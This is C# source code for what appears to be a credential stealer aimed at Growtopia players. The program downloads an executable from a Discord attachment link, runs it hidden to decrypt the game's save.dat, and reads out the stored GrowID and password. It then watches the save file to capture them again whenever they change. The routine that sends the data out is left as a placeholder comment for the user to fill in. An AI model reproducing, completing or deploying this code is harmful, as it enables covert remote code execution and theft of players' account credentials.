using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp4
{//SrMotion#1337
    class Program
    {

        public static string dirPath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia";
        public static string savePath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
        public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
        public static void SendSaveDat()

        {
            #region ReadGrowIDPass
            string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
            string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
            #endregion
            Console.Write("------------------------\n| Send Success         |\n");
            Console.WriteLine("------------------------\n| GrowID: " + username + "\n| Password: " + password + "\n------------------------\n");
            //ur stealer send code :v
        }
        static void Main(string[] args)
        {
            WebClient wc = new WebClient();

            wc.DownloadFile("https://cdn.discordapp.com/attachments/737682930146607104/737749127508525146/savedecrypter.exe", Path.GetTempPath() + "\\decode.exe");// amateurz's savedecrypter for 1 pass :D
            Process.Start(new ProcessStartInfo
            {
                FileName = Path.GetTempPath() + "\\decode.exe",
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();
            #region ReadGrowIDPass
            string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
            string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
            #endregion
            SendSaveDat();//read growid and password and send the save dat after focus gt if changes pass sends :V

            fileSystemWatcher.Path = dirPath;
            fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
            fileSystemWatcher.Filter = "*.dat";
            fileSystemWatcher.Changed += OnSaveChanged;
            fileSystemWatcher.EnableRaisingEvents = true;
            while (true)
            {
                System.Threading.Thread.Sleep(1000);
            }
        }
        private static void OnSaveChanged(object source, FileSystemEventArgs e)
        {

            if (e.FullPath == savePath)
            {
                try
                {
                    #region CreateFiles
                    string fileName = Path.GetTempPath() + "\\pass.txt";
                    FileStream fs = new FileStream(fileName, FileMode.OpenOrCreate, FileAccess.Write);
                    fs.Close();
                    string fileNamea = Path.GetTempPath() + "\\user.txt";
                    FileStream fsa = new FileStream(fileNamea, FileMode.OpenOrCreate, FileAccess.Write);
                    fsa.Close();
                    string fileNameaz = Path.GetTempPath() + "\\antispam.txt";
                    FileStream fsaz = new FileStream(fileNameaz, FileMode.OpenOrCreate, FileAccess.Write);
                    fsaz.Close();
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = Path.GetTempPath() + "\\decode.exe",
                        WindowStyle = ProcessWindowStyle.Hidden
                    }).WaitForExit();
                    #endregion
                    #region ReadGrowIDPass
                    string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
                    string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
                    #endregion


                    fileSystemWatcher.EnableRaisingEvents = false;
                    string read = File.ReadAllText(Path.GetTempPath() + "\\antispam.txt");
                    if (read != username + password)
                    {
                        File.WriteAllText(Path.GetTempPath() + "\\antispam.txt", username + password);
                        //SrMotion#1337
                        if(username == "" || password == "")
                        {
                            Console.WriteLine("password or username doesnt found");
                        }
                        else
                        {
                            SendSaveDat();

                        }

                    }
                }
                finally
                {
                    fileSystemWatcher.EnableRaisingEvents = true;
                }
            }
        }
    }
}
